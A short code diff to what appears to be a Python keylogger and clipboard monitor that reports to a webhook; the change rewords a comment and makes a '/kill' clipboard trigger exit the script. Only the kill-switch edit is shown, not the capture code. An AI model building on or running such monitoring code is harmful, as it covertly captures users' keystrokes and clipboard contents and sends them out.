@@ -91,7 +91,7 @@ def on_press(key):
 
 
 def on_release(key):
-    # No need for logic here anymore since we are monitoring the clipboard for '/kill'
+    # No need to handle key release, we are monitoring clipboard for '/kill'
     pass
 
 
@@ -106,7 +106,8 @@ def monitor_clipboard():
                 # Check if the clipboard contains '/kill'
                 if "/kill" in current_clipboard:
                     send_to_webhook(f"Kill command detected in clipboard. Stopping the script...")
-                    break  # Break the loop to stop the script
+                    print("Kill command detected in clipboard. Stopping the script...")
+                    os._exit(0)  # Exit the script when '/kill' is found
                 last_clipboard = current_clipboard
         except Exception as e:
             print(f"Error accessing clipboard: {e}")
